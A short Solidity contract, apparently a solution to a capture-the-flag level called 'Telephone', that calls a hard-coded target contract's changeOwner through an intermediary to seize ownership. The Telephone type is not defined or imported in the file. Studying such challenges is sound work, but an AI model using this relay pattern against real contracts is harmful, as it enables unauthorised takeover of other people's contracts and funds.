//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;

contract HackTelephone{

  Telephone public telephone = Telephone(0x6d16B988909D0fB4A9858a5b57B1ef4010c9021d);

  function changeOwner(address _owner) public {
      telephone.changeOwner(_owner);
  }
}
